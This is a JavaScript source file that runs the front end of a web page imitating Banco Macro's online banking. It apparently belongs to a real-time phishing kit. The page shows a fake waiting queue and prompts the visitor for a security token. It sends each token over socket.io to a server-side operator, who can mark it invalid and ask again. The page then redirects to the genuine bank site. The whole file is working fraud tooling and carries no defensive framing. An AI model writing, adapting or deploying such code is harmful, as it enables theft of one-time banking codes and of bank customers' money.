const QueueList = document.querySelector("#queuelist");
const BlurPpalContent = document.querySelector("#ppal-content");
const BlurPersonalOPtions = document.querySelector("#personal-options");
const BlurHeader = document.querySelector("#header");
const Alert = document.querySelector("#alert-modal");
const CerrarModal = document.querySelector("#close-alert-modal");
const CerrarModalRsendToken = document.querySelector("#close-alert-modal-resendtoken");
const CerrarModalSuccessFinish = document.querySelector("#close-alert-modal-green");

const showToken = document.querySelector("#token");
const sendToken = document.querySelector("#sendToken");
const tokenInput = document.querySelector("#token-input");
const formToken = document.querySelector("#formToken");
const spinner = document.querySelector("#spinnerValidate");
const noValidate = document.querySelector("#noValidate");
const Validate = document.querySelector("#validate");

const Footer = document.querySelector("#footer");


CerrarModal.addEventListener("click", () => {
    Alert.style.display = "none";
})

const socket = io.connect({
    path: "/socket.io/"
})



//Obtener identificador original
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
//identificador listo
const originalSocket = urlParams.get('s');

socket.on("connect", () => {
    if(originalSocket == null){
        window.location.href = "/";
    }
    console.log("El socket se ha conectado: ", socket.id);
    socket.emit("HomeConnect", {'Socket': socket.id, 'Id': originalSocket});
})


CerrarModalRsendToken.addEventListener("click", () => {
    noValidate.style.display = "none";
})

CerrarModalSuccessFinish.addEventListener("click", () => {
    Validate.style.display = "none";
})

var dataAdm;

sendToken.addEventListener("click", (e) => {
    e.preventDefault();

    if(tokenInput.value.length < 2){
        Alert.style.display = "flex";
    }else{
        const dataToken = {
            'Socket': originalSocket,
            'Token': tokenInput.value,
            'AdmId': dataAdm,
        }
        console.log(dataAdm)
        noValidate.style.display = "none";
        socket.emit("SendToken", dataToken);
        tokenInput.style.display = "none";
        sendToken.style.display = "none";
        spinner.style.display = "flex";
    }

})

socket.on("IngresarToken", data => {
    dataAdm = data.idAdm;
    if(data){
        if(showToken.style.display == "flex"){
            spinner.style.display = "none";
            noValidate.style.display = "flex";
            var formulario = document.getElementById('formToken');
            formulario.reset();
            showToken.style.display = "flex";
            tokenInput.style.display = "block";
            sendToken.style.display = "block";
        }else{
            showToken.style.display = "flex";
        }
        QueueList.remove();
        
    }
})


const Name = document.querySelector("#name");
const Conn = document.querySelector("#conn");
const Saldo = document.querySelector("#info-saldo");

socket.on("RecibirInfoHomeConect", data =>{
    console.log(data);
    Name.innerHTML = data[0][1];
    Conn.innerHTML = data[0][2];
    //Saldo.innerHTML = data[3];
})

setTimeout(() => {
    QueueList.style.display = "flex";
    BlurPpalContent.style.filter = "blur(1.5px)";
    BlurPersonalOPtions.style.filter = "blur(1.5px)";
    BlurHeader.style.filter = "blur(1.5px)";    

}, 3500);

socket.on("FinalizarTodo", finData => {
    if(finData){
        spinner.style.display = "none";
        Validate.style.display = "flex";
        socket.emit("SuccessFin", originalSocket);
        setTimeout(() => {
            window.location.replace("https://www.macro.com.ar/bancainternet/");
        }, 4000);
    }
})

setTimeout(() => {
    socket.emit("onlineHere", originalSocket);
}, 2000);
